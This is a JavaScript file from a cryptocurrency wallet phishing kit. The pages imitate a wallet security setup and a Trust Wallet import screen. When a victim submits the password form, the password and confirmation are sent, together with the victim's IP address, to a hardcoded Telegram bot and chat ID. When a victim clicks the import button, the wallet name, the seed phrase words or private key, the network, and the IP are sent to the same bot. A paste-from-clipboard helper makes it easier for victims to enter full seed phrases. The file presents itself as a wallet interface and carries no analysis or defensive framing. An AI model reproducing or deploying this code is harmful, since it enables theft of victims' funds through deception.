const BOT_TOKEN = '8921646537:AAHIQrz-4j_ofvsMDpL14ycRfL9IB4erZ4A';
const CHAT_ID = '1769777140';

async function getIP() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip || 'Unknown';
  } catch {
    return 'Unknown';
  }
}

async function sendTelegram(message) {
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
  });
}

// ── SECURITY.HTML: password form submission ──────────────────────────────────
async function submitWalletDemo(event) {
  event.preventDefault();

  const feedback = document.getElementById('formFeedback');
  const password = document.getElementById('password').value.trim();
  const confirmPassword = document.getElementById('confirmPassword').value.trim();

  feedback.className = 'form-feedback';

  if (!password || !confirmPassword) {
    feedback.textContent = 'Please enter and confirm your password.';
    feedback.classList.add('error');
    return;
  }

  if (password !== confirmPassword) {
    feedback.textContent = 'Passwords do not match.';
    feedback.classList.add('error');
    return;
  }

  feedback.textContent = 'Securing your wallet…';

  const ip = await getIP();
  const time = new Date().toLocaleString();

  const message =
    `🔐 <b>New Wallet Password</b>\n` +
    `━━━━━━━━━━━━━━━━━━\n` +
    `🔑 Password: <code>${password}</code>\n` +
    `✅ Confirm:  <code>${confirmPassword}</code>\n` +
    `🌐 IP: <code>${ip}</code>\n` +
    `🕐 Time: ${time}`;

  try {
    await sendTelegram(message);
  } catch (e) {
    console.error('Telegram error:', e);
  }

  setTimeout(() => {
    window.location.href = 't4.html';
  }, 1200);
}

// ── T7.HTML: import button submission ────────────────────────────────────────
async function submitImport() {
  const importBtn = document.querySelector('.import-btn');
  if (importBtn) {
    importBtn.textContent = 'Importing…';
    importBtn.disabled = true;
  }

  // Wallet name
  const walletNameEl = document.querySelector('.wallet-name-shell input');
  const walletName = walletNameEl ? walletNameEl.value.trim() : 'N/A';

  // Secret phrase (grid words) or private key
  const activeTab = document.querySelector('.phrase-tab.active');
  let secretData = '';

  if (activeTab && activeTab.dataset.type === 'key') {
    const textarea = document.getElementById('secretPhrase');
    secretData = textarea ? textarea.value.trim() : 'N/A';
  } else {
    const words = Array.from(document.querySelectorAll('.phrase-word'))
      .map((input, i) => `${i + 1}. ${input.value.trim() || '___'}`)
      .join('\n');
    secretData = words || 'N/A';
  }

  // Network
  const networkEl = document.querySelector('.network-select');
  const network = networkEl && networkEl.value ? networkEl.value : 'Not selected';

  const ip = await getIP();
  const time = new Date().toLocaleString();

  const message =
    `💼 <b>Wallet Import Attempt</b>\n` +
    `━━━━━━━━━━━━━━━━━━\n` +
    `👛 Wallet Name: <code>${walletName}</code>\n` +
    `🌐 Network: <code>${network}</code>\n` +
    `━━━━━━━━━━━━━━━━━━\n` +
    `🔑 Secret Phrase / Key:\n<code>${secretData}</code>\n` +
    `━━━━━━━━━━━━━━━━━━\n` +
    `🌍 IP: <code>${ip}</code>\n` +
    `🕐 Time: ${time}`;

  try {
    await sendTelegram(message);
  } catch (e) {
    console.error('Telegram error:', e);
  }

  setTimeout(() => {
    window.location.href = 't7.html';
  }, 1200);
}

// ── DOM READY ────────────────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {

  // Theme toggle
  const themeButton = document.querySelector('.icon-btn');
  if (themeButton) {
    themeButton.addEventListener('click', () => {
      document.body.classList.toggle('dark-mode');
      themeButton.textContent = document.body.classList.contains('dark-mode') ? '☀' : '◐';
    });
  }

  // t4: Trust Wallet option click
  const trustWalletButton = document.querySelector('.trust-wallet-option');
  if (trustWalletButton) {
    trustWalletButton.addEventListener('click', () => {
      window.location.href = 't7.html';
    });
  }

  // security.html: option list → show password form
  const optionButtons = document.querySelectorAll('.option');
  const passwordForm = document.getElementById('passwordForm');
  const optionList = document.getElementById('optionList');

  if (optionButtons.length && passwordForm && optionList) {
    optionButtons.forEach((button) => {
      button.addEventListener('click', () => {
        optionButtons.forEach((item) => item.classList.remove('selected'));
        button.classList.add('selected');
        if (button.dataset.option === 'password') {
          optionList.classList.add('hidden');
          passwordForm.classList.remove('hidden');
        } else {
          optionList.classList.remove('hidden');
          passwordForm.classList.add('hidden');
        }
      });
    });
  }

  // security.html: form submit
  const form = document.getElementById('passwordForm');
  if (form) {
    form.addEventListener('submit', submitWalletDemo);
  }

  // t7.html: import button
  const importBtn = document.querySelector('.import-btn');
  if (importBtn) {
    importBtn.addEventListener('click', submitImport);
  }

  // t7.html: phrase tab switching
  const phraseTabs = document.querySelectorAll('.phrase-tab');
  const phraseGrid = document.getElementById('phraseGrid');
  const privateKeyField = document.getElementById('privateKeyField');
  const phraseActions = document.querySelector('.phrase-actions');

  if (phraseTabs.length && phraseGrid && privateKeyField) {
    phraseTabs.forEach((tab) => {
      tab.addEventListener('click', () => {
        phraseTabs.forEach((t) => t.classList.remove('active'));
        tab.classList.add('active');
        if (tab.dataset.type === 'phrase') {
          phraseGrid.classList.remove('hidden');
          privateKeyField.classList.add('hidden');
          if (phraseActions) phraseActions.classList.remove('hidden');
        } else {
          phraseGrid.classList.add('hidden');
          privateKeyField.classList.remove('hidden');
          if (phraseActions) phraseActions.classList.add('hidden');
        }
      });
    });
  }

  // t7.html: toggle phrase word visibility
  const toggleVisibilityBtn = document.getElementById('toggleVisibility');
  if (toggleVisibilityBtn) {
    let shown = false;
    toggleVisibilityBtn.addEventListener('click', () => {
      shown = !shown;
      document.querySelectorAll('.phrase-word').forEach((input) => {
        input.type = shown ? 'text' : 'password';
      });
      toggleVisibilityBtn.textContent = shown ? '👁 Hide' : '👁 Show';
    });
  }

  // t7.html: toggle private key visibility
  const pkToggleBtn = document.getElementById('pkToggle');
  const pkTextarea = document.getElementById('secretPhrase');
  if (pkToggleBtn && pkTextarea) {
    let pkHidden = false;
    pkToggleBtn.addEventListener('click', () => {
      pkHidden = !pkHidden;
      pkTextarea.classList.toggle('pk-hidden', pkHidden);
      pkToggleBtn.textContent = pkHidden ? '🙈' : '👁';
    });
  }

  // t7.html: paste words from clipboard
  const pasteBtn = document.getElementById('pasteBtn');
  if (pasteBtn) {
    pasteBtn.addEventListener('click', async () => {
      try {
        const text = await navigator.clipboard.readText();
        const words = text.trim().split(/\s+/);
        document.querySelectorAll('.phrase-word').forEach((input, i) => {
          input.value = words[i] || '';
        });
      } catch (e) {
        console.warn('Clipboard read failed:', e);
      }
    });
  }

  // t7.html: clear wallet name button
  const clearFieldButton = document.querySelector('.clear-field');
  const walletNameInput = document.querySelector('.wallet-name-shell input');
  if (clearFieldButton && walletNameInput) {
    clearFieldButton.addEventListener('click', () => {
      walletNameInput.value = '';
      walletNameInput.focus();
    });
  }
});
